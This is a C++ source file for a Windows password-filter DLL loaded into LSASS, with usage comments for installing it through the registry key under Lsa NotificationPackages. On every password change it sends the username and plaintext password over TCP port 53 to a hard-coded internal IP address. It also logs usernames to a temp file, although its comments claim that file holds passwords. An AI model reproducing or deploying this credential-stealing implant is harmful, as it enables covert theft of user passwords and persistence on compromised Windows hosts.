//USAGE
//this library compiles into a dll file
//place this dll file in the system32 directory
//edit the regkey HKLM:\System\CurrentControlSet\Control\Lsa -> notificationPackages
//add the name of the dll you placed into sys32 (minus the .dll part)
//restart the box.
//the dll should now be visible in procexp loaded under LSASS.exe
//passwords should be saved in C:\Windows\temp\lsass.log

//
// Asa Horn
// aoh9470@rit.edu
//

#include <winsock2.h>
#include <Windows.h>
#include <SubAuth.h>

//////// Helper functions

//Sends a *unicode_string over a raw socket to a (hard coded) remote server.
//takes: a pointer to a unicode string
//returns: a status
NTSTATUS SendToRemote(PUNICODE_STRING text){
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serverAddr;

    //Start win sock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        //std::cerr << "WSAStartup failed with error: " << WSAGetLastError() << std::endl;
        return 1;
    }

    //create a socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        //std::cerr << "Socket creation failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 2;
    }

    // Set up the sockaddr_in structure
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(53);
    serverAddr.sin_addr.s_addr = inet_addr("10.50.0.10");

    //Start a TCP connection
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        //std::cerr << "Failed to connect to server: " << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return 3;
    }

    //send it
    if (send(sock, (const char*)text->Buffer, text->Length, 0) == SOCKET_ERROR) {
        //std::cerr << "Send failed with error: " << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return 4;
    }

    // Cleanup
    closesocket(sock);
    WSACleanup();
    return 0;
}

//Concatante two PUNICODE strings.
//I really hope you like pointer silliness
//because I don't
// in: String1, String2: the strings to stick together
// out: Result: a pointer to populate with the result
NTSTATUS catUTF16LEStr(
        _In_ PUNICODE_STRING String1,
        _In_ PUNICODE_STRING String2,
        _Out_ PUNICODE_STRING Result
) {
    if (!String1 || !String2 || !Result) {
        return STATUS_INVALID_PARAMETER;
    }

    // Calculate the total length needed for the result
    USHORT totalLength = String1->Length + String2->Length;

    // Allocate memory for the result buffer
    Result->Buffer = (PWCHAR)HeapAlloc(GetProcessHeap(), 0, totalLength + sizeof(WCHAR));
    if (!Result->Buffer) {
        return STATUS_NO_MEMORY;
    }

    // Copy the strings into the buffer
    memcpy(Result->Buffer, String1->Buffer, String1->Length);
    memcpy((BYTE*)Result->Buffer + String1->Length, String2->Buffer, String2->Length);

    // Set the length and maximum length of the resulting string
    Result->Length = totalLength;
    Result->MaximumLength = totalLength + sizeof(WCHAR);

    // Null-terminate the result string
    *(PWCHAR)((BYTE*)Result->Buffer + totalLength) = L'\0';

    return STATUS_SUCCESS;
}

//Write a *unicodestring to a hardcoded file
//For writing the passwords
//takes: PUNICODE_STRING to write
//returns: status
NTSTATUS writeToFile(PUNICODE_STRING text) {
    //open a file (the janky windows way)
    HANDLE hFile = CreateFileW(
            L"C:\\Windows\\temp\\lsass.log",
            FILE_APPEND_DATA,
            FILE_SHARE_READ,
            NULL,
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
    );

    //debug
    if (hFile == INVALID_HANDLE_VALUE) {
        //printf("bad handle: %d", hFile);
        return 1;
    }
    // Move file pointer to the end for appending
    SetFilePointer(hFile, 0, NULL, FILE_END);

    //Do you see why I hate stupid unicode now
    // Write BOM (byte order mark) if the file is new (just created)
    // this tells windows that it is looking at unicode rather than ascii
    // and prevents null bytes between ascii letters.
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0) {
        WORD bom = 0xFEFF;
        DWORD bytesWritten;
        WriteFile(hFile, &bom, sizeof(bom), &bytesWritten, NULL);
    }

    //write the file to disk using fileapi (thanks windows)
    DWORD bytesWritten;
    BOOL result = WriteFile(
            hFile,
            text->Buffer,
            text->Length,
            &bytesWritten,
            NULL
    );

    if(result != TRUE) {
        //std::cerr << "error writing";
        return 2;
    }

    CloseHandle(hFile);
    return 0;
}


////////////////Real functions

//boilerplate dll (I think. TBH this could be doing nothing, but I am not touching it now)
BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved){
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

//on load
// True for successful load, false for failure
extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void) {
    return TRUE; //error handling / init is lame
}

//called when user is attempting to change password
//return FALSE to deny change, TRUE to accept
//this function being called does not mean the change was successful
extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING uname, PUNICODE_STRING legalName, PUNICODE_STRING password, BOOLEAN SetOperation){
    return TRUE; //not going to actually prevent password changes right now
}

//called to notify that a password change has successfully occurred
//return 0 for OK, other number for error code
extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(PUNICODE_STRING uname, ULONG RelativeId, PUNICODE_STRING password){
    HANDLE hHeap = NULL; // I love windows. malloc is for losers

    hHeap = HeapCreate(0, 0, 0);
    if(hHeap == NULL){
        //std::cerr << "Could not create heap"
        return 1;
    }


    //build the unicode chars for building the output
    wchar_t singleColon = L':';
    UNICODE_STRING colon = { 2, 2, &singleColon };
    wchar_t singleNL = L'\n';
    UNICODE_STRING newline = { 2, 2, &singleNL };

    //Concatenate UnicodeStrings
    PUNICODE_STRING temp1 = (PUNICODE_STRING) HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(PUNICODE_STRING));
    PUNICODE_STRING temp2 = (PUNICODE_STRING) HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(PUNICODE_STRING));
    PUNICODE_STRING fullString = (PUNICODE_STRING) HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(PUNICODE_STRING));
    catUTF16LEStr(uname, &colon, temp1);
    catUTF16LEStr(password, &newline, temp2);
    catUTF16LEStr(temp1, temp2, fullString);

    //Actually do the work
    SendToRemote(fullString);
    writeToFile(uname);

    //try to avoid memory leaks
    HeapFree(hHeap, 0, temp1);
    HeapFree(hHeap, 0, temp2);
    HeapFree(hHeap, 0, fullString);
    HeapDestroy(hHeap);
    return 0;
}
